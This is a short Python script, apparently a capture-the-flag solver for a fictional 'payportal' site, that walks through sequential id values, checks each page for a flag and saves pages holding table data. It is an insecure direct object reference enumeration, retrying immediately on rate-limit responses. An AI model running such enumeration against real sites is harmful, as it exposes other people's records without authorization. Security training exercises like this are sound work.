import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://payportal.quoccacorp.com"
# PAYLOAD = ""

class Solver:
    def __init__(self):
        self.session = get_session()

    def run(self):
        # We need to start from 1. There are entries in id=0
        i = 1
        while True:
            url = f"{BASE_URL}/?id={str(i)}"
            print(f"🔗 {url = }")
            response = self.session.get(url)
            if response.status_code == 429:
                continue

            find_flag(response.text)

            soup = BeautifulSoup(response.text, "html.parser")
            if soup.find_all("td"):
                with open(f"response_{i}.html", "w") as file:
                    file.write(url + '\n')
                    file.write(response.text)

            i += 1

if __name__ == "__main__":
    Solver().run()